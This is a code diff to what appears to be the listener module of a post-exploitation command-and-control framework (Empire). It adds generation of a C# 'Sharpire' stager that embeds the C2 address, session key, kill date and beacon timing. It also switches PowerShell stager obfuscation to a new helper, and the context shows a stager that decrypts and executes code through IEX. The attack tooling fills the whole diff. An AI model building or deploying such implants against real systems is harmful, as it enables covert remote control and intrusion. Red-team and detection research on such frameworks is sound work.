@@ -233,7 +233,7 @@ class Listener(object):
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
+                    stager = data_util.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
@@ -338,6 +338,34 @@ class Listener(object):
                 else:
                     return launcherBase
 
+            if language.startswith("csh"):
+                workingHours = listenerOptions['WorkingHours']['Value']
+                killDate = listenerOptions['KillDate']['Value']
+                customHeaders = profile.split('|')[2:]
+                delay = listenerOptions['DefaultDelay']['Value']
+                jitter = listenerOptions['DefaultJitter']['Value']
+                lostLimit = listenerOptions['DefaultLostLimit']['Value']
+
+                with open(self.mainMenu.installPath + "/stagers/Sharpire.yaml", "rb") as f:
+                    stager_yaml = f.read()
+                stager_yaml = stager_yaml.decode("UTF-8")
+                stager_yaml = stager_yaml \
+                    .replace("{{ REPLACE_ADDRESS }}", host) \
+                    .replace("{{ REPLACE_SESSIONKEY }}", stagingKey) \
+                    .replace("{{ REPLACE_PROFILE }}", profile) \
+                    .replace("{{ REPLACE_WORKINGHOURS }}", workingHours) \
+                    .replace("{{ REPLACE_KILLDATE }}", killDate) \
+                    .replace("{{ REPLACE_DELAY }}", str(delay)) \
+                    .replace("{{ REPLACE_JITTER }}", str(jitter)) \
+                    .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
+
+                compiler = self.mainMenu.loadedPlugins.get("csharpserver")
+                if not compiler.status == 'ON':
+                    print(helpers.color('[!] csharpserver plugin not running'))
+                else:
+                    file_name = compiler.do_send_stager(stager_yaml, "Sharpire")
+                    return file_name
+
             else:
                 print(helpers.color(
                     "[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."))
@@ -411,7 +439,7 @@ class Listener(object):
                         randomizedStager += line
 
             if obfuscate:
-                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager,
+                randomizedStager = data_util.obfuscate(self.mainMenu.installPath, randomizedStager,
                                                      obfuscationCommand=obfuscationCommand)
             # base64 encode the stager and return it
             if encode:
@@ -504,7 +532,7 @@ class Listener(object):
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
             if obfuscate:
-                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
+                code = data_util.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
             return code
 
         elif language == 'python':
@@ -538,6 +566,10 @@ class Listener(object):
             if workingHours != "":
                 code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
 
+            return code
+        elif language == "csharp":
+            # currently the agent is stageless so do nothing
+            code = ""
             return code
         else:
             print(helpers.color(
@@ -736,7 +768,7 @@ def send_message(packets=None):
 
             if self.mainMenu.agents.is_agent_present(sessionID) and isElevated:
 
-                if self.mainMenu.agents.get_language_db(sessionID).startswith("po"):
+                if self.mainMenu.agents.get_language_db(sessionID).startswith("po") or self.mainMenu.agents.get_language_db(sessionID).startswith("csh"):
                     # logic for powershell agents
                     script = """
         function Invoke-Redirector {
